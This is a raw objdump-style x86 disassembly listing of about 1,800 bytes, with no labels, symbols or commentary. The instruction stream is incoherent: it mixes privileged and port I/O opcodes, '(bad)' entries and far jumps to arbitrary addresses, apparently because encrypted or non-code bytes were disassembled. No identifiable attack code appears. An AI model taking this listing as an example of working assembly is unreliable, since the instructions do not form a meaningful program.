  40aa42:	mov    esi,0x86be39cd
  40aa47:	lahf   
  40aa48:	or     ecx,DWORD PTR [esi]
  40aa4a:	icebp  
  40aa4b:	cmp    edi,DWORD PTR [eax+0x2661bbde]
  40aa51:	xchg   edi,eax
  40aa52:	sbb    al,0x6b
  40aa54:	test   eax,0x288b2c0
  40aa59:	xchg   ecx,eax
  40aa5a:	mov    esi,ebp
  40aa5c:	inc    ebx
  40aa5d:	cli    
  40aa5e:	lea    esp,[eax+0x2d]
  40aa61:	sbb    BYTE PTR [ebx],bl
  40aa63:	pop    edx
  40aa64:	push   cs
  40aa65:	mul    DWORD PTR [edx+ebx*1-0x73]
  40aa69:	sub    eax,0xad3884cd
  40aa6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa6f:	sbb    eax,DWORD PTR [edi+0x72d55c74]
  40aa75:	add    eax,0x1c5ba871
  40aa7a:	pop    esp
  40aa7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa7c:	push   esi
  40aa7d:	jae    0x40aad9
  40aa7f:	xchg   ebp,eax
  40aa80:	test   al,0x7f
  40aa82:	push   ebx
  40aa83:	mov    esi,0x456580e
  40aa88:	into   
  40aa89:	add    DWORD PTR [ebx-0x7e],0xffffffbc
  40aa8d:	loop   0x40aaf8
  40aa8f:	sub    BYTE PTR [ebx],cl
  40aa91:	push   ebp
  40aa92:	push   ds
  40aa93:	(bad)  
  40aa94:	jmp    0xa740c0d0
  40aa99:	mov    ds:0x834e2470,eax
  40aa9e:	sbb    cl,BYTE PTR [edi]
  40aaa0:	inc    eax
  40aaa1:	fldenv [ecx]
  40aaa4:	jecxz  0x40ab20
  40aaa6:	fist   DWORD PTR [eax-0x674cfcba]
  40aaac:	push   0xb103dc0
  40aab1:	or     ch,cl
  40aab3:	cld    
  40aab4:	idiv   BYTE PTR [esi-0xe]
  40aab7:	sub    ebp,eax
  40aab9:	xor    eax,0x5ce561fc
  40aabe:	sbb    esp,DWORD PTR [ecx-0x58]
  40aac1:	xchg   ecx,eax
  40aac2:	ret    
  40aac3:	fsubr  DWORD PTR [ebx+0x17]
  40aac6:	out    dx,al
  40aac7:	mov    cl,0xc6
  40aac9:	add    edi,ebx
  40aacb:	push   eax
  40aacc:	pop    edi
  40aacd:	pop    es
  40aace:	xor    esp,DWORD PTR [eax]
  40aad0:	pop    edi
  40aad1:	push   ecx
  40aad2:	adc    dh,bh
  40aad4:	mov    dh,0x5c
  40aad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aad7:	push   ss
  40aad8:	neg    ch
  40aada:	fcomp  DWORD PTR [ecx+ebx*2]
  40aadd:	int3   
  40aade:	cmp    DWORD PTR [ebp+0x24],edi
  40aae1:	loopne 0x40aab7
  40aae3:	jge    0x40aa71
  40aae5:	in     al,dx
  40aae6:	pop    ds
  40aae7:	jbe    0x40ab2a
  40aae9:	mov    ds:0xa53fcb92,eax
  40aaee:	inc    eax
  40aaef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aaf0:	cmc    
  40aaf1:	dec    esp
  40aaf2:	jnp    0x40ab35
  40aaf4:	jb     0x40ab69
  40aaf6:	pop    esp
  40aaf7:	push   ecx
  40aaf8:	and    ch,BYTE PTR [eax+0x1a150f12]
  40aafe:	mov    esi,0x3270e43
  40ab03:	hlt    
  40ab04:	call   0x41f45a25
  40ab09:	and    eax,0x3d31cbea
  40ab0e:	xor    al,0xf0
  40ab10:	cmp    al,0x23
  40ab12:	cmp    BYTE PTR [ebx],ch
  40ab14:	pop    edi
  40ab15:	and    eax,0xcf7421b4
  40ab1a:	pop    esp
  40ab1b:	int3   
  40ab1c:	rcr    ch,0x3
  40ab1f:	jbe    0x40aaf6
  40ab21:	hlt    
  40ab22:	sbb    DWORD PTR [edi],esp
  40ab24:	jmp    0xb1ac:0x8557f2e8
  40ab2b:	pop    esp
  40ab2c:	push   esp
  40ab2d:	addr16 out 0x5c,al
  40ab30:	add    ah,BYTE PTR [edi-0x5b]
  40ab33:	std    
  40ab34:	ja     0x40ab72
  40ab36:	out    0xc6,al
  40ab38:	jl     0x40ab30
  40ab3a:	sub    bh,BYTE PTR [ebp-0x6cc5253d]
  40ab40:	or     DWORD PTR [eax+0x6e],0xffffffb3
  40ab44:	shl    DWORD PTR [ebx-0x29],1
  40ab47:	mov    al,0x55
  40ab49:	int3   
  40ab4a:	dec    ebp
  40ab4b:	test   al,0x10
  40ab4d:	cmp    DWORD PTR [edx],esp
  40ab4f:	add    al,0xd1
  40ab51:	mov    ds:0x92aa9dcf,eax
  40ab56:	ret    0xb0f9
  40ab59:	idiv   BYTE PTR [edx+0xf]
  40ab5c:	xchg   ebx,eax
  40ab5d:	jl     0x40ab6e
  40ab5f:	sbb    DWORD PTR [edi+0xe],esp
  40ab62:	fld    DWORD PTR [ebx+0x52]
  40ab65:	dec    ebx
  40ab66:	lea    edi,[eax+0x46b46ac]
  40ab6c:	test   BYTE PTR [esi+0x72848178],0xb2
  40ab73:	div    DWORD PTR [edi+edi*2-0x6346b014]
  40ab7a:	inc    edi
  40ab7b:	repnz test bh,dl
  40ab7e:	fisttp QWORD PTR [eax-0x301698c8]
  40ab84:	cmp    ebx,esp
  40ab86:	cmp    esi,DWORD PTR ds:0x27ae9e0c
  40ab8c:	scas   al,BYTE PTR es:[edi]
  40ab8d:	outs   dx,BYTE PTR ds:[esi]
  40ab8e:	add    ch,BYTE PTR [esi-0x4610134]
  40ab94:	pop    eax
  40ab95:	dec    edi
  40ab96:	invd   
  40ab98:	mov    ah,0x3f
  40ab9a:	or     BYTE PTR [ecx],0xc6
  40ab9d:	cs pop ds
  40ab9f:	pop    ds
  40aba0:	sub    cl,dl
  40aba2:	stc    
  40aba3:	loop   0x40ac14
  40aba5:	pop    es
  40aba6:	jle    0x40abd8
  40aba8:	je     0x40ab97
  40abaa:	xor    eax,0x41ed7b52
  40abaf:	pop    esp
  40abb0:	stos   DWORD PTR es:[edi],eax
  40abb1:	jmp    0x40abc1
  40abb3:	xchg   edx,eax
  40abb4:	sbb    bh,ah
  40abb6:	sar    ecx,cl
  40abb8:	inc    edi
  40abb9:	mov    cl,0x57
  40abbb:	adc    BYTE PTR [ebx],bl
  40abbd:	or     eax,0xef8ddba0
  40abc2:	int3   
  40abc3:	aad    0xa6
  40abc5:	(bad)  
  40abc7:	sub    DWORD PTR [esi-0x5a0108d6],esi
  40abcd:	dec    ebx
  40abce:	popa   
  40abcf:	outs   dx,DWORD PTR ds:[esi]
  40abd0:	cdq    
  40abd1:	adc    al,0xd0
  40abd3:	pop    ds
  40abd4:	jmp    0xa5c0:0x54cc09e5
  40abdb:	shr    BYTE PTR [esi],1
  40abdd:	fsubr  DWORD PTR [eax-0x9a15cc2]
  40abe3:	(bad)  
  40abe4:	sbb    eax,0xca8b6066
  40abe9:	into   
  40abea:	sbb    eax,0x57373916
  40abef:	cmp    edx,ecx
  40abf1:	inc    esp
  40abf2:	cmp    BYTE PTR [esi-0xe],cl
  40abf5:	clc    
  40abf6:	or     bl,BYTE PTR [ecx+0x5c236f28]
  40abfc:	pop    ss
  40abfd:	cmp    al,0x63
  40abff:	push   esi
  40ac00:	xchg   edx,eax
  40ac01:	mov    al,dh
  40ac03:	add    BYTE PTR [edi],bl
  40ac05:	lds    ebp,FWORD PTR [edi+edx*4]
  40ac08:	push   edx
  40ac09:	mov    al,ds:0xef3fbaf0
  40ac0e:	mov    edi,0xbe6de1c0
  40ac13:	ds pop es
  40ac15:	pop    esi
  40ac16:	inc    ecx
  40ac17:	xchg   BYTE PTR [ecx-0x10],ch
  40ac1a:	in     eax,dx
  40ac1b:	pop    esp
  40ac1c:	sbb    esi,DWORD PTR [ecx]
  40ac1e:	or     al,0x68
  40ac20:	xchg   ebx,eax
  40ac21:	out    dx,al
  40ac22:	lods   eax,DWORD PTR ds:[esi]
  40ac23:	sub    eax,0x29cc19ed
  40ac28:	inc    edi
  40ac29:	bswap  eax
  40ac2b:	rcr    DWORD PTR [edi],0x8f
  40ac2e:	jae    0x40abb1
  40ac30:	ins    DWORD PTR es:[edi],dx
  40ac31:	enterw 0xae5a,0xd8
  40ac36:	outs   dx,DWORD PTR ds:[esi]
  40ac37:	std    
  40ac38:	fst    DWORD PTR [ebx]
  40ac3a:	xchg   ebx,eax
  40ac3b:	inc    esi
  40ac3c:	fist   WORD PTR ds:0x7a050fee
  40ac42:	stos   DWORD PTR es:[edi],eax
  40ac43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac44:	mov    bh,BYTE PTR [ebx]
  40ac46:	and    DWORD PTR [esi+0x16],ebx
  40ac49:	ds std 
  40ac4b:	lock popa 
  40ac4d:	sub    edx,esi
  40ac4f:	or     ecx,DWORD PTR [eax]
  40ac51:	ins    DWORD PTR es:[edi],dx
  40ac52:	leave  
  40ac53:	mov    al,ds:0x49941f34
  40ac58:	loopne 0x40ac9b
  40ac5a:	arpl   WORD PTR [eax+eiz*2+0x1d],bx
  40ac5e:	push   es
  40ac5f:	out    0x2f,al
  40ac61:	mov    ecx,ebx
  40ac63:	pop    esp
  40ac64:	std    
  40ac65:	stos   DWORD PTR es:[edi],eax
  40ac66:	std    
  40ac67:	jae    0x40aca5
  40ac69:	xchg   edi,eax
  40ac6a:	push   edx
  40ac6b:	cld    
  40ac6c:	dec    edi
  40ac6d:	test   DWORD PTR [ebx-0x55],0x37295ac3
  40ac74:	xchg   ecx,eax
  40ac75:	cmc    
  40ac76:	paddusb mm0,QWORD PTR [edi-0x40]
  40ac7a:	or     BYTE PTR [esi+ebx*1-0x4fd85b73],0x20
  40ac82:	test   eax,0x4ff92976
  40ac87:	das    
  40ac88:	xor    al,0x18
  40ac8a:	imul   edi,DWORD PTR [eax+0x235b2ba7],0x5df6d663
  40ac94:	mov    ds:0xa99158ae,eax
  40ac99:	sar    DWORD PTR [edi],0x7a
  40ac9c:	mov    ds:0x24ff452,al
  40aca1:	and    BYTE PTR [ebx],bl
  40aca3:	adc    ebp,DWORD PTR [ecx-0x2db6b23e]
  40aca9:	shl    DWORD PTR [ecx+ebp*1],1
  40acac:	and    ch,bh
  40acae:	mov    eax,ds:0x6412c2b5
  40acb3:	push   edx
  40acb4:	pushf  
  40acb5:	jae    0x40ad32
  40acb7:	jecxz  0x40ad2c
  40acb9:	(bad)  
  40acba:	mov    ebx,DWORD PTR [ebp+0x3a]
  40acbd:	inc    eax
  40acbe:	dec    ebx
  40acbf:	lahf   
  40acc0:	jg     0x40ac43
  40acc2:	and    esi,esi
  40acc4:	ficom  DWORD PTR [esi-0x45]
  40acc7:	xor    BYTE PTR [ebx-0x291d2608],cl
  40accd:	xor    eax,0xaacf3561
  40acd2:	or     DWORD PTR [ecx+0x4906b7cb],0x7b
  40acd9:	enter  0xd9f,0x4d
  40acdd:	dec    ebx
  40acde:	fs xchg ebx,eax
  40ace0:	cwde   
  40ace1:	retf   0x62af
  40ace4:	xor    dl,0xef
  40ace7:	xor    BYTE PTR [eax-0x533d2db7],0xca
  40acee:	mov    bl,0x61
  40acf0:	push   edx
  40acf1:	xor    DWORD PTR [eax-0x307a917a],ecx
  40acf7:	cmp    al,BYTE PTR [esi+0x4]
  40acfa:	aas    
  40acfb:	push   edi
  40acfc:	icebp  
  40acfd:	adc    cl,al
  40acff:	leave  
  40ad00:	adc    BYTE PTR [esi+0x43],bh
  40ad03:	xor    BYTE PTR [ecx+0xf0d098f],0x88
  40ad0a:	arpl   WORD PTR [esi+0x11],di
  40ad0d:	stc    
  40ad0e:	sub    ecx,DWORD PTR [edi]
  40ad10:	adc    DWORD PTR [esi-0x37],0xffffffe4
  40ad14:	and    dh,0xff
  40ad17:	cmp    DWORD PTR [esi],eax
  40ad19:	imul   esi,DWORD PTR [edi],0x1cc45d7c
  40ad1f:	retf   0xbe3f
  40ad22:	add    esi,ebx
  40ad24:	aad    0x87
  40ad26:	lock popf 
  40ad28:	cdq    
  40ad29:	mov    dl,0xa8
  40ad2b:	xchg   BYTE PTR [esi+edx*1-0x6b2f053],ah
  40ad32:	pop    ebx
  40ad33:	and    DWORD PTR [edi],esi
  40ad35:	pushf  
  40ad36:	push   esi
  40ad37:	mov    esp,0x5155e1d6
  40ad3c:	outs   dx,BYTE PTR ds:[esi]
  40ad3d:	adc    al,0xbb
  40ad3f:	and    DWORD PTR [edi+ecx*8-0x7a],esp
  40ad43:	in     al,dx
  40ad44:	add    ebx,edi
  40ad46:	or     ebx,eax
  40ad48:	repz jmp 0xcfd9dddb
  40ad4e:	ss (bad) 
  40ad50:	fisttp QWORD PTR [edx+0x3f845d21]
  40ad56:	rol    BYTE PTR [ecx],1
  40ad58:	adc    DWORD PTR [edx],0xffffffee
  40ad5b:	mov    eax,ds:0xcbce6771
  40ad60:	xor    eax,0x6cde5120
  40ad65:	retf   
  40ad66:	push   0xe51ca068
  40ad6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad6c:	ret    
  40ad6d:	sbb    dh,ah
  40ad6f:	sti    
  40ad70:	push   ecx
  40ad71:	std    
  40ad72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad73:	ins    BYTE PTR es:[edi],dx
  40ad74:	rol    BYTE PTR [edi*2-0x642902f9],0x6b
  40ad7c:	or     eax,0x453dc7bc
  40ad81:	call   0xe935ae86
  40ad86:	repnz push esp
  40ad88:	xchg   edx,eax
  40ad89:	adc    eax,0x87593fb1
  40ad8e:	adc    DWORD PTR [edx-0x66d991f8],eax
  40ad94:	mov    ebp,0xd0c13431
  40ad99:	shl    BYTE PTR [esi-0x54609246],1
  40ad9f:	ror    DWORD PTR gs:[ecx-0x2a7ccacc],cl
  40ada6:	div    bh
  40ada8:	test   eax,0x790c09cb
  40adad:	jmp    0x40ad69
  40adaf:	ins    BYTE PTR es:[edi],dx
  40adb0:	mov    eax,0xfe83f2e1
  40adb5:	mov    bh,0x9a
  40adb7:	lock xacquire add DWORD PTR [ebx+ecx*8-0x15c0289d],edi
  40adc0:	cmp    edi,DWORD PTR [edx]
  40adc2:	fwait
  40adc3:	test   BYTE PTR [ebp+eiz*2-0x2815355],dl
  40adca:	fist   DWORD PTR [esi-0x56]
  40adcd:	ja     0x40ae2d
  40adcf:	xor    ah,BYTE PTR [edx]
  40add1:	leave  
  40add2:	mov    ds:0x5e72a670,al
  40add7:	push   ds
  40add8:	sar    BYTE PTR [ebx],cl
  40adda:	ret    0xfb7e
  40addd:	cs cmc 
  40addf:	sub    BYTE PTR [ebx+edx*2+0x3],dh
  40ade3:	mov    cl,0x81
  40ade5:	push   esi
  40ade6:	inc    ebp
  40ade7:	imul   ebp,DWORD PTR [edi-0x2c19f235],0xffffff8c
  40adee:	adc    BYTE PTR [ebx-0x61a6a836],dh
  40adf4:	jbe    0x40add0
  40adf6:	sahf   
  40adf7:	test   BYTE PTR [edx],dl
  40adf9:	aas    
  40adfa:	pop    edi
  40adfb:	fidivr DWORD PTR ds:0x7a3c5f93
  40ae01:	das    
  40ae02:	gs mov dl,0xf1
  40ae05:	stc    
  40ae06:	mov    ds:0x634a773c,eax
  40ae0b:	iret   
  40ae0c:	pop    ebx
  40ae0d:	je     0x40ae75
  40ae0f:	push   esp
  40ae10:	fiadd  WORD PTR [ebx+edi*4]
  40ae13:	inc    edx
  40ae14:	and    ch,al
  40ae16:	mov    ecx,0xe28476ff
  40ae1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae1c:	mov    eax,0xa156ddd7
  40ae21:	jmp    0x40ae50
  40ae23:	dec    edx
  40ae24:	jle    0x40aea0
  40ae26:	lds    esp,FWORD PTR [eax-0x3981bf1c]
  40ae2c:	jns    0x40ae7a
  40ae2e:	daa    
  40ae2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae30:	dec    esi
  40ae31:	mov    ebx,0x75e72567
  40ae36:	cmc    
  40ae37:	hlt    
  40ae38:	pop    esi
  40ae39:	cmp    eax,0x236bbb3f
  40ae3e:	shl    esp,cl
  40ae40:	mov    ah,0xb5
  40ae42:	dec    edx
  40ae43:	push   esp
  40ae44:	inc    ebx
  40ae45:	scas   eax,DWORD PTR es:[edi]
  40ae46:	dec    ebp
  40ae47:	push   ebp
  40ae48:	pusha  
  40ae49:	cmc    
  40ae4a:	test   DWORD PTR [ebx-0x2dd59ab2],esi
  40ae50:	sbb    DWORD PTR [ecx],edx
  40ae52:	in     al,0xa2
  40ae54:	jle    0x40ae9d
  40ae56:	or     bl,al
  40ae58:	sub    ecx,DWORD PTR [ebx-0x6d4eef59]
  40ae5e:	ins    BYTE PTR es:[edi],dx
  40ae5f:	xchg   DWORD PTR [edx-0x1],esi
  40ae62:	adc    edi,DWORD PTR [edi-0x46]
  40ae65:	jge    0x40aebd
  40ae67:	rcl    cl,1
  40ae69:	cwde   
  40ae6a:	mov    al,ds:0x44a3ecda
  40ae6f:	icebp  
  40ae70:	out    0xd8,al
  40ae72:	fistp  QWORD PTR [edx]
  40ae74:	xor    al,0xb0
  40ae76:	cld    
  40ae77:	(bad)  
  40ae78:	sub    ebp,ecx
  40ae7a:	cs aam 0xa5
  40ae7d:	test   al,0x31
  40ae7f:	cmc    
  40ae80:	std    
  40ae81:	mov    edi,0xce84d184
  40ae86:	fisttp DWORD PTR [ebx-0x7557b020]
  40ae8c:	xchg   edx,eax
  40ae8d:	pop    eax
  40ae8e:	shl    DWORD PTR [esi-0x3e],0x68
  40ae92:	test   DWORD PTR [esi],ebp
  40ae94:	fdiv   QWORD PTR [ebp+eax*4-0x59c74a70]
  40ae9b:	pop    esp
  40ae9c:	jmp    0x9c6c:0xa53f09cc
  40aea3:	js     0x40ae9b
  40aea5:	add    eax,0x63caad8e
  40aeaa:	push   ebp
  40aeab:	mov    BYTE PTR [eax-0x5a],ah
  40aeae:	mov    eax,ds:0xd9469109
  40aeb3:	bound  ebx,QWORD PTR [ebx+0x5a35c46a]
  40aeb9:	jp     0x40aed0
  40aebb:	test   al,0xf6
  40aebd:	das    
  40aebe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aebf:	pop    esi
  40aec0:	lock jns 0x40aee6
  40aec3:	push   edi
  40aec4:	lods   al,BYTE PTR ds:[esi]
  40aec5:	in     al,dx
  40aec6:	ror    esp,0xf8
  40aec9:	sub    BYTE PTR [ecx-0x2a3197b2],ch
  40aecf:	(bad)  
  40aed1:	pop    esp
  40aed2:	mov    ch,0xc5
  40aed4:	or     DWORD PTR [eax+ecx*4-0x1c069356],eax
  40aedb:	outs   dx,DWORD PTR ds:[esi]
  40aedc:	sbb    ecx,eax
  40aede:	add    DWORD PTR [edx-0x69ad4ff9],0x78
  40aee5:	push   ebp
  40aee6:	sub    esi,DWORD PTR [ecx]
  40aee8:	test   cl,al
  40aeea:	xor    al,0x8a
  40aeec:	fs jp  0x40aeca
  40aeef:	pushf  
  40aef0:	or     ebx,DWORD PTR [esi+ebx*8+0x10]
  40aef4:	loopne 0x40af33
  40aef6:	mov    ch,0xc5
  40aef8:	ss ret 
  40aefa:	psrlq  mm4,QWORD PTR [edi]
  40aefd:	dec    edx
  40aefe:	mov    ds:0xc7dcdbd0,eax
  40af03:	push   esi
  40af04:	int    0xed
  40af06:	push   eax
  40af07:	mov    ebx,0xe1c1d214
  40af0c:	push   ebx
  40af0d:	loope  0x40aec0
  40af0f:	sbb    BYTE PTR [esi+edx*2],bl
  40af12:	fstp   TBYTE PTR ds:0x309be733
  40af18:	sbb    BYTE PTR [eax],0x82
  40af1b:	inc    ebx
  40af1c:	cli    
  40af1d:	and    al,0x36
  40af1f:	xchg   edi,eax
  40af20:	mov    edi,0xbd139af7
  40af25:	outs   dx,DWORD PTR ds:[esi]
  40af26:	mov    BYTE PTR [ecx-0x64],dh
  40af29:	mov    ds,WORD PTR ds:0x6da44cb6
  40af2f:	(bad)  
  40af30:	loope  0x40af48
  40af32:	ret    
  40af33:	push   eax
  40af34:	in     eax,dx
  40af35:	mov    WORD PTR [eax-0x26],ss
  40af38:	fadd   DWORD PTR [ebp-0x71c9a379]
  40af3e:	div    BYTE PTR [ebx+0x77]
  40af41:	imul   ebp,DWORD PTR [eax],0xffffff8f
  40af44:	cmp    ebx,0x48355cc
  40af4a:	mov    dh,0x6a
  40af4c:	sub    al,0x1c
  40af4e:	rcr    bl,1
  40af50:	dec    edi
  40af51:	out    0x12,al
  40af53:	(bad)  
  40af54:	push   cs
  40af55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af56:	dec    eax
  40af57:	shl    DWORD PTR [ecx-0x39d796ce],cl
  40af5d:	mov    ecx,0xd38984b5
  40af62:	outs   dx,BYTE PTR ds:[esi]
  40af63:	out    0x31,al
  40af65:	push   esp
  40af66:	xchg   DWORD PTR [ecx+0xe526a42],ebx
  40af6c:	or     DWORD PTR [edi+0x1398db00],edi
  40af72:	dec    ecx
  40af73:	sahf   
  40af74:	jp     0x40af07
  40af76:	push   edi
  40af77:	sbb    DWORD PTR [esi+0x2cce8130],edx
  40af7d:	mov    ecx,0xea10d87f
  40af82:	imul   edi,ecx,0x20
  40af85:	fadd   DWORD PTR [edx+0x50b039f3]
  40af8b:	sub    cl,ah
  40af8d:	jecxz  0x40afc8
  40af8f:	sbb    eax,ebp
  40af91:	test   DWORD PTR [edx+0x3c16b706],edi
  40af97:	ja     0x40af5a
  40af99:	mov    ds:0x97eb380e,al
  40af9e:	pop    ds
  40af9f:	es ret 0x7fbd
  40afa3:	xchg   esi,eax
  40afa4:	and    ebp,DWORD PTR ds:0xeddcaa65
  40afaa:	pop    esp
  40afab:	lock inc edi
  40afad:	jmp    0x40afe3
  40afaf:	fs xor eax,0xad8744fa
  40afb5:	pop    edx
  40afb6:	jno    0x40aff6
  40afb8:	pushf  
  40afb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afba:	xor    eax,0x4e6fffd
  40afbf:	cmp    al,0x63
  40afc1:	xchg   esi,eax
  40afc2:	test   eax,0xb19f2cfa
  40afc7:	jnp    0x40af81
  40afc9:	stc    
  40afca:	icebp  
  40afcb:	and    dl,cl
  40afcd:	jecxz  0x40b030
  40afcf:	sahf   
  40afd0:	in     al,0xbb
  40afd2:	inc    edx
  40afd3:	mov    ebp,0xf80eae5a
  40afd8:	add    al,0x35
  40afda:	call   0x32836fca
  40afdf:	stos   BYTE PTR es:[edi],al
  40afe0:	push   esp
  40afe1:	sbb    dl,BYTE PTR [eax-0x40]
  40afe4:	cmc    
  40afe5:	mov    al,ds:0x5ec94421
  40afea:	lods   eax,DWORD PTR ds:[esi]
  40afeb:	and    BYTE PTR [edx],bl
  40afed:	add    cl,BYTE PTR [edx-0x692c6b21]
  40aff3:	mov    edx,0x1df59f9c
  40aff8:	cli    
  40aff9:	and    ecx,DWORD PTR fs:[ebp-0x69]
  40affd:	xchg   edi,ebx
  40afff:	adc    dl,BYTE PTR [esi]
  40b001:	push   ebx
  40b002:	es adc edi,edx
  40b005:	add    edx,ebx
  40b007:	js     0x40b063
  40b009:	addr16 xchg edx,eax
  40b00b:	cs out dx,eax
  40b00d:	mov    al,ds:0x2511ca46
  40b012:	pop    eax
  40b013:	jecxz  0x40afdc
  40b015:	mov    ds:0x373397d9,al
  40b01a:	ret    0x5b48
  40b01d:	cmp    DWORD PTR [ebp+0x5cbc98e9],esi
  40b023:	sub    al,0x10
  40b025:	pop    edx
  40b026:	aaa    
  40b027:	fsub   QWORD PTR [edx]
  40b029:	pop    eax
  40b02a:	adc    al,0x70
  40b02c:	dec    ebx
  40b02d:	retf   0x4128
  40b030:	sbb    BYTE PTR [ebx-0x7c91a859],ch
  40b036:	fadd   st,st(0)
  40b038:	hlt    
  40b039:	pushf  
  40b03a:	xlat   BYTE PTR ds:[ebx]
  40b03b:	loopne 0x40b089
  40b03d:	and    al,0x30
  40b03f:	push   0x31665ea
  40b044:	pop    ebx
  40b045:	ss mov dl,0x4d
  40b048:	mov    bh,0x39
  40b04a:	aaa    
  40b04b:	stc    
  40b04c:	pop    esp
  40b04d:	cld    
  40b04e:	in     al,dx
  40b04f:	xor    al,0xff
  40b051:	mov    BYTE PTR [ebx+ecx*8-0x66],cl
  40b055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b056:	xchg   ebx,eax
  40b057:	stc    
  40b058:	(bad)  
  40b059:	dec    ebp
  40b05a:	jg     0x40b0a2
  40b05c:	hlt    
  40b05d:	cmp    bl,ah
  40b05f:	call   0x2b:0x4cf6137f
  40b066:	sbb    al,0xf8
  40b068:	daa    
  40b069:	jns    0x40b000
  40b06b:	ret    0xe0fd
  40b06e:	(bad)  
  40b06f:	push   edx
  40b070:	inc    eax
  40b071:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b072:	les    eax,FWORD PTR [ebx+0x2e]
  40b075:	out    0x3a,eax
  40b077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b078:	jmpw   0xc16
  40b07c:	call   0xa772:0x3a2bcb3b
  40b083:	inc    ecx
  40b084:	and    al,0x90
  40b086:	dec    ebp
  40b087:	or     eax,0xe27b1a5e
  40b08c:	ja     0x40b027
  40b08e:	push   edx
  40b08f:	sub    BYTE PTR [eax+edx*8],0xaa
  40b093:	mov    bl,dl
  40b095:	lock sub DWORD PTR [eax],0xc2cf6148
  40b09c:	sbb    ebx,edi
  40b09e:	std    
  40b09f:	scas   eax,DWORD PTR es:[edi]
  40b0a0:	cli    
  40b0a1:	mov    ebp,0x8327dfe3
  40b0a6:	push   eax
  40b0a7:	mov    ebx,0x7f187d98
  40b0ac:	jle    0x40b104
  40b0ae:	loop   0x40b10f
  40b0b0:	aad    0xaf
  40b0b2:	js     0x40b076
  40b0b4:	or     dl,BYTE PTR [ecx+0x39]
  40b0b7:	pop    ss
  40b0b8:	push   edx
  40b0b9:	out    dx,al
  40b0ba:	sub    edi,edx
  40b0bc:	push   0xd6c6b9d3
  40b0c1:	call   0xa4fe9602
  40b0c6:	adc    BYTE PTR [esp+esi*2-0x126d67c1],bl
  40b0cd:	lds    edi,FWORD PTR [edx-0x6e]
  40b0d0:	sub    dh,BYTE PTR [edi+ebx*1]
  40b0d3:	nop
  40b0d4:	fldenv [edi-0x28553b25]
  40b0da:	fbstp  TBYTE PTR [edx]
  40b0dc:	push   esp
  40b0dd:	scas   al,BYTE PTR es:[edi]
  40b0de:	sbb    al,0x44
  40b0e0:	or     al,0x25
  40b0e2:	mov    esi,0x94238130
  40b0e7:	adc    BYTE PTR [ecx-0x2844eb87],bl
  40b0ed:	not    esi
  40b0ef:	repz jns 0x40b113
  40b0f2:	jno    0x40b0e3
  40b0f4:	mov    al,0xf7
  40b0f6:	push   es
  40b0f7:	mov    ds:0xae12cef9,eax
  40b0fc:	(bad)  
  40b0fd:	aad    0xc5
  40b0ff:	outs   dx,BYTE PTR ds:[esi]
  40b100:	pop    ebx
  40b101:	add    al,cl
  40b103:	mov    ds:0xe60aed37,eax
  40b108:	xor    bh,ch
  40b10a:	out    dx,al
  40b10b:	xlat   BYTE PTR ds:[ebx]
  40b10c:	mov    dh,0xcf
  40b10e:	mov    ds:0x37810dbe,al
  40b113:	gs ins BYTE PTR es:[edi],dx
  40b115:	and    edx,ecx
  40b117:	inc    esi
  40b118:	ss in  al,dx
  40b11a:	add    ah,BYTE PTR [eax]
  40b11c:	hlt    
  40b11d:	stc    
  40b11e:	inc    edi
  40b11f:	iret   
  40b120:	cmp    eax,0x5d837a6e
  40b125:	int3   
  40b126:	mov    edx,0xdd1562b3
  40b12b:	xor    dl,cl
  40b12d:	loopne 0x40b1ac
  40b12f:	scas   eax,DWORD PTR es:[edi]
  40b130:	out    0x95,eax
  40b132:	and    DWORD PTR [edx-0x5c7ae063],edi
  40b138:	push   0xc8df66d3
  40b13d:	pop    ecx
  40b13e:	inc    eax
  40b13f:	and    al,0xea
  40b141:	push   ecx
  40b142:	leave  
  40b143:	call   0x53a4:0x9c9c314f
  40b14a:	int    0xd
  40b14c:	popf   
  40b14d:	into   
  40b14e:	(bad)  
  40b14f:	push   0x7e5e04e5
  40b154:	jne    0x40b10a
  40b156:	je     0x40b0ec
  40b158:	xor    dh,dh
  40b15a:	cmp    DWORD PTR [eax],edi
  40b15c:	ror    BYTE PTR [ebx-0x65782d36],cl
  40b162:	ror    eax,0x90
  40b165:	and    al,0x36
  40b167:	cld    
  40b168:	and    DWORD PTR [ebp+0x44],edi
  40b16b:	xor    dh,BYTE PTR [ecx]
  40b16d:	cmp    al,0x10
  40b16f:	sahf   
  40b170:	adc    ebp,0xb244f923
  40b176:	xor    cl,BYTE PTR [ecx]
  40b178:	adc    esp,0x1f
  40b17b:	pusha  
  40b17c:	or     BYTE PTR [edx+0x20],dh
  40b17f:	xchg   esi,eax
  40b180:	xor    BYTE PTR [ebp-0x15868d48],dl
  40b186:	mov    bl,0x2b
  40b188:	call   0x284e0da8
  40b18d:	sbb    DWORD PTR [ecx+eax*8+0x16],edx
  40b191:	test   al,0x9
  40b193:	stos   DWORD PTR es:[edi],eax
  40b194:	cli    
  40b195:	(bad)  
  40b196:	pop    es
  40b197:	dec    ebp
  40b198:	sub    eax,0xdabb0c8f
  40b19d:	sbb    edi,ecx
  40b19f:	mov    ch,0x36
  40b1a1:	in     eax,dx
  40b1a2:	push   esi
  40b1a3:	loop   0x40b18e
  40b1a5:	lods   eax,DWORD PTR ds:[esi]
  40b1a6:	xchg   cl,cl
  40b1a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1a9:	cmp    eax,edi
  40b1ab:	push   edx
  40b1ac:	pusha  
  40b1ad:	daa    
  40b1ae:	pop    edx
  40b1af:	outs   dx,BYTE PTR ds:[esi]
